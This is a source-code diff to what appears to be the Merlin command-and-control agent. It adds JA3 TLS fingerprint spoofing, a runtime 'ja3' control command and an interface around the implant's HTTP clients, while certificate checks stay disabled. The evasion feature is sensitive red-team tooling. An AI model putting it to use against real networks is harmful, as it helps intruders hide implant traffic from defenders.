@@ -42,6 +42,7 @@ import (
 	"strings"
 	"time"
 
+	"github.com/Ne0nd0g/ja3transport"
 	// 3rd Party
 	"github.com/cretz/gopaque/gopaque"
 	"github.com/fatih/color"
@@ -61,6 +62,13 @@ import (
 
 // GLOBAL VARIABLES
 var build = "nonRelease" // build is the build number of the Merlin Agent program set at compile time
+
+type merlinClient interface {
+	Do(req *http.Request) (*http.Response, error)
+	Get(url string) (resp *http.Response, err error)
+	Head(url string) (resp *http.Response, err error)
+	Post(url, contentType string, body io.Reader) (resp *http.Response, err error)
+}
 
 //TODO this is a duplicate with agents/agents.go, centralize
 
@@ -86,7 +94,7 @@ type Agent struct {
 	Verbose       bool            // Verbose enables verbose messages to standard out
 	Debug         bool            // Debug enables debug messages to standard out
 	Proto         string          // Proto contains the transportation protocol the agent is using (i.e. h2 or hq)
-	Client        *http.Client    // Client is an http.Client object used to make HTTP connections for agent communications
+	Client        *merlinClient   // Client is an interface for clients to make connections for agent communications
 	UserAgent     string          // UserAgent is the user agent string used with HTTP connections
 	initial       bool            // initial identifies if the agent has successfully completed the first initial check in
 	KillDate      int64           // killDate is a unix timestamp that denotes a time the executable will not run after (if it is 0 it will not be used)
@@ -98,10 +106,11 @@ type Agent struct {
 	Host          string          // HTTP Host header, typically used with Domain Fronting
 	pwdU          []byte          // SHA256 hash from 5000 iterations of PBKDF2 with a 30 character random string input
 	psk           string          // Pre-Shared Key
+	JA3           string          // JA3 signature (not the MD5 hash) use to generate a JA3 client
 }
 
 // New creates a new agent struct with specific values and returns the object
-func New(protocol string, url string, host string, psk string, proxy string, verbose bool, debug bool) (Agent, error) {
+func New(protocol string, url string, host string, psk string, proxy string, ja3 string, verbose bool, debug bool) (Agent, error) {
 	if debug {
 		message("debug", "Entering agent.New function")
 	}
@@ -123,6 +132,7 @@ func New(protocol string, url string, host string, psk string, proxy string, ver
 		KillDate:     0,
 		URL:          url,
 		Host:         host,
+		JA3:          ja3,
 	}
 
 	u, errU := user.Current()
@@ -156,12 +166,13 @@ func New(protocol string, url string, host string, psk string, proxy string, ver
 		}
 	}
 
-	client, errClient := getClient(a.Proto, proxy)
+	var errClient error
+
+	a.Client, errClient = getClient(a.Proto, proxy, a.JA3)
+
 	if errClient != nil {
 		return a, fmt.Errorf("there was an error getting a transport client:\r\n%s", errClient)
 	}
-
-	a.Client = client
 
 	// Generate a random password and run it through 5000 iterations of PBKDF2; Used with OPAQUE
 	x := core.RandStringBytesMaskImprSrc(30)
@@ -190,6 +201,7 @@ func New(protocol string, url string, host string, psk string, proxy string, ver
 		message("info", fmt.Sprintf("\tIPs: %v", a.Ips))
 		message("info", fmt.Sprintf("\tProtocol: %s", a.Proto))
 		message("info", fmt.Sprintf("\tProxy: %v", proxy))
+		message("info", fmt.Sprintf("\tJA3 Signature: %s", a.JA3))
 	}
 	if debug {
 		message("debug", "Leaving agent.New function")
@@ -239,7 +251,7 @@ func (a *Agent) Run() error {
 	}
 }
 
-func (a *Agent) initialCheckIn(client *http.Client) bool {
+func (a *Agent) initialCheckIn(client *merlinClient) bool {
 
 	if a.Debug {
 		message("debug", "Entering initialCheckIn function")
@@ -372,7 +384,9 @@ func (a *Agent) statusCheckIn() {
 }
 
 // getClient returns a HTTP client for the passed in protocol (i.e. h2 or hq)
-func getClient(protocol string, proxyURL string) (*http.Client, error) {
+func getClient(protocol string, proxyURL string, ja3 string) (*merlinClient, error) {
+
+	var m merlinClient
 
 	/* #nosec G402 */
 	// G402: TLS InsecureSkipVerify set true. (Confidence: HIGH, Severity: HIGH) Allowed for testing
@@ -387,36 +401,61 @@ func getClient(protocol string, proxyURL string) (*http.Client, error) {
 		NextProtos: []string{protocol},
 	}
 
+	// Proxy
+	var proxy func(*http.Request) (*url.URL, error)
+	if proxyURL != "" {
+		rawURL, errProxy := url.Parse(proxyURL)
+		if errProxy != nil {
+			return nil, fmt.Errorf("there was an error parsing the proxy string:\r\n%s", errProxy.Error())
+		}
+		proxy = http.ProxyURL(rawURL)
+	}
+
+	// JA3
+	if ja3 != "" {
+		JA3, errJA3 := ja3transport.NewWithStringInsecure(ja3)
+		if errJA3 != nil {
+			return &m, fmt.Errorf("there was an error getting a new JA3 client:\r\n%s", errJA3.Error())
+		}
+		tr, err := ja3transport.NewTransportInsecure(ja3)
+		if err != nil {
+			return nil, err
+		}
+
+		// Set proxy
+		if proxyURL != "" {
+			tr.Proxy = proxy
+		}
+
+		JA3.Transport = tr
+
+		m = JA3
+		return &m, nil
+	}
+
 	switch strings.ToLower(protocol) {
 	case "hq":
 		transport := &h2quic.RoundTripper{
 			QuicConfig:      &quic.Config{IdleTimeout: 168 * time.Hour},
 			TLSClientConfig: TLSConfig,
 		}
-		return &http.Client{Transport: transport}, nil
+		m = &http.Client{Transport: transport}
+		return &m, nil
 	case "h2":
 		transport := &http2.Transport{
 			TLSClientConfig: TLSConfig,
 		}
-		return &http.Client{Transport: transport}, nil
+		m = &http.Client{Transport: transport}
+		return &m, nil
 	case "https":
-		if proxyURL != "" {
-			rawURL, errProxy := url.Parse(proxyURL)
-			if errProxy != nil {
-				return nil, fmt.Errorf("there was an error parsing the proxy string:\r\n%s", errProxy.Error())
-			}
-			proxy := http.ProxyURL(rawURL)
-			transport := &http.Transport{
-				TLSClientConfig: TLSConfig,
-				Proxy:           proxy,
-			}
-			return &http.Client{Transport: transport}, nil
-		}
-
 		transport := &http.Transport{
 			TLSClientConfig: TLSConfig,
 		}
-		return &http.Client{Transport: transport}, nil
+		if proxyURL != "" {
+			transport.Proxy = proxy
+		}
+		m = &http.Client{Transport: transport}
+		return &m, nil
 	default:
 		return nil, fmt.Errorf("%s is not a valid client protocol", protocol)
 	}
@@ -471,7 +510,10 @@ func (a *Agent) sendMessage(method string, m messages.Base) (messages.Base, erro
 		}
 
 		// Send the request
-		resp, err := a.Client.Do(req)
+		var client merlinClient // Why do I need to prove that a.Client is merlinClient type?
+		client = *a.Client
+		resp, err := client.Do(req)
+
 		if err != nil {
 			return returnMessage, fmt.Errorf("there was an error with the HTTP client while performing a POST:\r\n%s", err.Error())
 		}
@@ -773,6 +815,24 @@ func (a *Agent) messageHandler(m messages.Base) (messages.Base, error) {
 			if a.Verbose {
 				message("info", fmt.Sprintf("Set Kill Date to: %s",
 					time.Unix(a.KillDate, 0).UTC().Format(time.RFC3339)))
+			}
+		case "ja3":
+			a.JA3 = strings.Trim(p.Args, "\"'")
+
+			//Update the client
+			var err error
+
+			a.Client, err = getClient(a.Proto, "", a.JA3)
+
+			if err != nil {
+				c.Stderr = fmt.Sprintf("there was an error setting the agent client:\r\n%s", err.Error())
+				break
+			}
+
+			if a.Verbose && a.JA3 != "" {
+				message("note", fmt.Sprintf("Set agent JA3 signature to:%s", a.JA3))
+			} else if a.Verbose && a.JA3 == "" {
+				message("note", fmt.Sprintf("Setting agent client back to default using %s protocol", a.Proto))
 			}
 		default:
 			c.Stderr = fmt.Sprintf("%s is not a valid AgentControl message type.", p.Command)
@@ -1319,6 +1379,7 @@ func (a *Agent) getAgentInfoMessage() messages.Base {
 		Proto:         a.Proto,
 		SysInfo:       sysInfoMessage,
 		KillDate:      a.KillDate,
+		JA3:           a.JA3,
 	}
 
 	baseMessage := messages.Base{
